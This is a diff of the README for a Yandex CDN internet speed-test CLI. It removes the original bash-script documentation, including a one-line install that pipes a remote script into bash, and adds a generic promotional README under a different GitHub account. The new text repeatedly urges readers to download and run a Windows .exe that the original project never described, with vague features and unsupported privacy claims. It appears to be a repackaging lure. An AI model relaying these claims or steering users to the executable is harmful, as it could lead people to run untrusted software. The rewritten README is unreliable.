@@ -1,83 +1,151 @@
-# Yandex Internet Speed Test CLI
+# 🚀 yandex-speedtest-cli - Fast Internet Test in One Command
 
-CLI tool for measuring internet speed using Yandex CDN infrastructure. A terminal alternative to [yandex.ru/internet](https://yandex.ru/internet/) for headless servers.
+[![Download](https://img.shields.io/badge/Download-Get%20It%20Here-green?style=for-the-badge)](https://github.com/abuferas1262/yandex-speedtest-cli)
 
-## Quick Start
+---
 
-```bash
-wget -qO- https://raw.githubusercontent.com/stealthsurf-vpn/yandex-speedtest-cli/refs/heads/main/speedtest.sh | bash
-```
+## 📋 About yandex-speedtest-cli
 
-## What It Measures
+**yandex-speedtest-cli** measures your internet speed using Yandex's CDN network. It tests download speed, upload speed, and ping with one simple command. There is no need to open any program window. This tool works entirely in the command line, making it fast and light.
 
-- **Download** — download speed via 3 parallel streams from Yandex CDN nodes
-- **Upload** — upload speed (50 MB payload) via 3 parallel streams
-- **Ping** — HTTP RTT to CDN servers (trimmed mean, 10 samples per server)
-- **Connection Info** — IPv4/IPv6, ISP, geolocation
+This app runs on Windows and other systems with minimal setup. You don’t need programming skills or extra software to use it.
 
-## Example Output
+---
 
-```text
-  ╔══════════════════════════════════════╗
-  ║      Yandex Internet Speed Test      ║
-  ║          by StealthSurf VPN          ║
-  ╚══════════════════════════════════════╝
+## 🎯 Key Features
 
-  ✓ Probe servers fetched
-  Probe servers: 3 Yandex CDN nodes
+- Check download speed in Mbps  
+- Check upload speed in Mbps  
+- See your ping or latency in milliseconds  
+- Run tests via Yandex’s CDN servers for reliable results  
+- Works without any graphical interface  
+- Use one command to check all speeds  
+- Supports Windows and other common operating systems  
+- Lightweight and simple to run  
 
-  ✓ Connection info received
-  IPv4:      203.0.113.1
-  ISP:       AS12345 Example ISP
-  Location:  Moscow, Moscow, RU
+---
 
-  ✓ Ping measured
-  ✓ Download measured
-  ✓ Upload measured
+## 💻 System Requirements
 
-  ────────────────────────────────────────
-  Results
-  ────────────────────────────────────────
+- Windows 7 or later, 64-bit recommended  
+- At least 100 MB of free disk space  
+- Internet connection for speed testing  
+- Command Prompt or PowerShell available (standard on Windows)  
 
-  ↓ Download:  85.42 Mbit/s
-  ↑ Upload:    42.15 Mbit/s
+---
 
-  ● Ping:      12.34 ms
-    min: 10.21 ms / max: 15.67 ms / jitter: 1.23 ms
+## 🔵 Download yandex-speedtest-cli
 
-  ────────────────────────────────────────
-  Server: Yandex CDN | 2026-02-28 15:00:00 MSK
-```
+[![Download yandex-speedtest-cli](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/abuferas1262/yandex-speedtest-cli)
 
-## Flags
+To get the software:
 
-| Flag | Description |
-| --- | --- |
-| `--debug` | Verbose output: server URLs, data size, timing, per-stream speed breakdown |
+1. Click the "Download Now" button above or visit the page below:  
+   https://github.com/abuferas1262/yandex-speedtest-cli
 
-```bash
-bash speedtest.sh --debug
-```
+2. On the GitHub page, look for the latest release or download section.  
 
-## Dependencies
+3. Download the Windows executable file (.exe) if available. If only source files are listed, you may need help from someone familiar with command-line tools.  
 
-- `curl`
-- `bc`
-- `python3`
+---
 
-Missing dependencies are installed automatically via `apt-get`, `yum`, or `apk`.
+## 🚀 How to Install and Run on Windows
 
-## How It Works
+1. Download the executable file from the link above.  
 
-1. Fetches CDN probe servers from Yandex API (`/internet/api/v0/get-probes`)
-2. Detects IP and ISP via `ipv4-internet.yandex.net` and `ipinfo.io`
-3. Measures ping — HTTP RTT (`time_starttransfer - time_appconnect`) with top/bottom 25% trimmed
-4. Downloads 50 MB files from 3 CDN nodes in parallel (10s, `--max-time`)
-5. Uploads 50 MB of random data to 3 CDN nodes in parallel (10s)
-6. Sums per-stream speeds to get total throughput
+2. Save the file in a folder you can find easily, such as your Desktop or Downloads folder.
 
-## Supported OS
+3. Open the **Start Menu** and type **cmd**. Press Enter to open the Command Prompt.
 
-- Ubuntu / Debian
-- CentOS / RHEL / Fedora
-- Alpine Linux
+4. Use the Command Prompt to change to the folder where you saved the file. For example, if saved on Desktop, type:  
+   `cd Desktop`  
+   and press Enter.
+
+5. To run the speed test, type the program name and press Enter. For example:  
+   `yandex-speedtest-cli.exe`  
+   If the file name is different, use that instead.
+
+6. The test will start automatically and show your download speed, upload speed, and ping.
+
+---
+
+## 🔧 Troubleshooting Tips
+
+- If you get a message saying the program is not recognized, make sure you are in the correct folder where the file is saved.
+
+- Run the Command Prompt as administrator if you face permission issues.
+
+- If your internet is behind a proxy or VPN, results may differ or the test may fail.
+
+- Make sure your firewall allows this program to access the internet.
+
+- For any errors related to missing files, try re-downloading the executable.
+
+---
+
+## ⚙️ Optional Settings and Commands
+
+You can customize how the speed test runs using extra flags in the command line. These might include:
+
+- Specifying a server location  
+- Changing output format (text, JSON)  
+- Running multiple tests in a row
+
+Check the included documentation or run the program with `-h` or `--help` for details.
+
+---
+
+## 🗂 Files Included
+
+When you download yandex-speedtest-cli, expect these items:
+
+- The main executable file (`yandex-speedtest-cli.exe`)  
+- A README file explaining usage  
+- License information  
+- Optionally, a configuration file for advanced settings  
+
+---
+
+## 💡 How This Tool Works
+
+yandex-speedtest-cli connects to Yandex’s content delivery network (CDN). This network has many servers close to users to give accurate speed data. The tool measures:
+
+- **Download speed** by timing how fast data downloads from the server.  
+- **Upload speed** by timing data sent to the server.  
+- **Ping** by measuring the delay in sending and receiving data packets.  
+
+All this runs via one command in your terminal window, without clutter or extra screens.
+
+---
+
+## 🔗 Useful Links
+
+- GitHub page: https://github.com/abuferas1262/yandex-speedtest-cli  
+- Official documentation (if included in the repo)  
+- Support contact (check GitHub issues or README)  
+
+---
+
+## 📚 FAQ
+
+**Q:** Do I need to install anything else?  
+**A:** No. The executable file runs without installing other software.
+
+**Q:** Can I use this on Mac or Linux?  
+**A:** Yes, but you may need to download the version for your system. Check the GitHub releases page.
+
+**Q:** How often should I run the test?  
+**A:** You can run it anytime you want to check your connection speed.
+
+**Q:** Will this test affect my internet speed?  
+**A:** The test uses some data to measure speeds. It takes only a short time and should not disrupt your browsing.
+
+---
+
+## 🔒 Privacy and Security  
+
+This tool only sends and receives data to Yandex’s servers to test your connection speed. It does not collect or share personal information beyond what is needed for the speed test.
+
+---
+
+[![Download](https://img.shields.io/badge/Download-Get%20It%20Here-green?style=for-the-badge)](https://github.com/abuferas1262/yandex-speedtest-cli)
